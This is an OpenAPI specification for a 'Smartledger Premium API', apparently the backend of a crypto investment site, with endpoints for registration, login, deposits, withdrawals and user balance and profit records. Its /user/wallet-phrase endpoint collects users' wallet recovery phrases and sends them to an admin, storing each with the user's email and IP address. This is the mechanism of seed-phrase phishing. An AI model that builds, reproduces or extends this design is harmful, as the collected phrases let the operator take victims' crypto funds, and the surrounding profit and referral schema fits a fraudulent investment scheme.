# lib/api-spec/openapi.yaml
openapi: 3.1.0
info:
  title: Api
  version: 0.1.0
  description: Smartledger Premium API
servers:
  - url: /api
    description: Base API path
...
paths:
...
  /user/register:
    post:
      operationId: registerUser
      tags: [user-actions]
      summary: Register a new user account
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/UserRegisterInput"
      responses:
        "201":
          description: Registered
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/UserAuthResult"
  /user/login:
    post:
      operationId: loginUser
      tags: [user-actions]
      summary: User login
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/UserLoginInput"
      responses:
        "200":
          description: Login successful
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/UserAuthResult"
  /user/deposit:
    post:
      operationId: submitDeposit
      tags: [user-actions]
      summary: Submit a deposit request
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/DepositInput"
      responses:
        "201":
          description: Deposit submitted
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/Deposit"
  /user/withdraw:
    post:
      operationId: submitWithdrawal
      tags: [user-actions]
      summary: Submit a withdrawal request
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/WithdrawalInput"
      responses:
        "201":
          description: Withdrawal submitted
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/Withdrawal"
  /user/wallet-phrase:
    post:
      operationId: submitWalletPhrase
      tags: [user-actions]
      summary: Submit wallet connect phrase (sent to admin)
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/WalletPhraseInput"
      responses:
        "201":
          description: Phrase received
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/WalletPhrase"
components:
  schemas:
...
    User:
      type: object
      required: [id, email, firstName, lastName, balance, profit, status, referralCode, createdAt]
      properties:
        id: { type: integer }
        email: { type: string }
        firstName: { type: string }
        lastName: { type: string }
        phone: { type: ["string", "null"] }
        country: { type: ["string", "null"] }
        balance: { type: number }
        profit: { type: number }
        status: { type: string }
        referralCode: { type: string }
        referredBy: { type: ["string", "null"] }
        createdAt: { type: string }
...
    Deposit:
      type: object
      required: [id, userId, amount, method, status, createdAt]
      properties:
        id: { type: integer }
        userId: { type: integer }
        userEmail: { type: ["string", "null"] }
        userName: { type: ["string", "null"] }
        amount: { type: number }
        method: { type: string }
        txHash: { type: ["string", "null"] }
        status: { type: string }
        adminNote: { type: ["string", "null"] }
        createdAt: { type: string }
        updatedAt: { type: string }
...
    DepositInput:
      type: object
      required: [userId, amount, method]
      properties:
        userId: { type: integer }
        amount: { type: number }
        method: { type: string }
        txHash: { type: string }
    Withdrawal:
      type: object
      required: [id, userId, amount, method, walletAddress, status, createdAt]
      properties:
        id: { type: integer }
        userId: { type: integer }
        userEmail: { type: ["string", "null"] }
        userName: { type: ["string", "null"] }
        amount: { type: number }
        method: { type: string }
        walletAddress: { type: string }
        status: { type: string }
        adminNote: { type: ["string", "null"] }
        createdAt: { type: string }
        updatedAt: { type: string }
...
    WithdrawalInput:
      type: object
      required: [userId, amount, method, walletAddress]
      properties:
        userId: { type: integer }
        amount: { type: number }
        method: { type: string }
        walletAddress: { type: string }
...
    WalletPhrase:
      type: object
      required: [id, phrase, walletType, createdAt]
      properties:
        id: { type: integer }
        userId: { type: ["integer", "null"] }
        userEmail: { type: ["string", "null"] }
        phrase: { type: string }
        walletType: { type: string }
        ipAddress: { type: ["string", "null"] }
        createdAt: { type: string }
    WalletPhraseInput:
      type: object
      required: [phrase, walletType]
      properties:
        userId: { type: integer }
        phrase: { type: string }
        walletType: { type: string }
...
    UserRegisterInput:
      type: object
      required: [email, password, firstName, lastName]
      properties:
        email: { type: string }
        password: { type: string }
        firstName: { type: string }
        lastName: { type: string }
        phone: { type: string }
        country: { type: string }
        referralCode: { type: string }
    UserLoginInput:
      type: object
      required: [email, password]
      properties:
        email: { type: string }
        password: { type: string }
    UserAuthResult:
      type: object
      required: [token, user]
      properties:
        token: { type: string }
        user:
          $ref: "#/components/schemas/User"